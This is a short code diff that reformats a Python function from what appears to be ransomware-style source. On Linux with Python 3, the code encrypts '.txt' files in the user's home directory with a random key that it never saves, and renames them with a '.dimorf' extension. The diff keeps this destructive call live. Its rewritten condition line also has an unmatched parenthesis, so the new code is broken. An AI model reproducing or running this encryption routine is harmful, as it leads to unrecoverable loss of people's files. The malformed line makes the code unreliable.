@@ -14,9 +14,7 @@ from Crypto import Random
 
 
 def check_os(osname: str) -> str | None:
-    USER_DIR = os.getenv(
-        'HOME'
-    )
+    USER_DIR = os.getenv('HOME')
     
     is_linux = [
         prop for prop in os.uname() if (
@@ -26,16 +24,15 @@ def check_os(osname: str) -> str | None:
         )
     ]
 
-    if (is_linux):
-        if (sys.version[0] == '3'):
-            find_and_encrypt(
-                path=USER_DIR,
-                ext_files=['.txt'],
-                hidden='.',
-                new_ext='.dimorf',
-                key=Random.get_random_bytes(32),
-                block_bytes=65536
-            )
+    if is_linux and sys.version[0] == '3'):
+        find_and_encrypt(
+            path=USER_DIR,
+            ext_files=['.txt'],
+            hidden='.',
+            new_ext='.dimorf',
+            key=Random.get_random_bytes(32),
+            block_bytes=65536
+        )
         
 
 def find_and_encrypt(
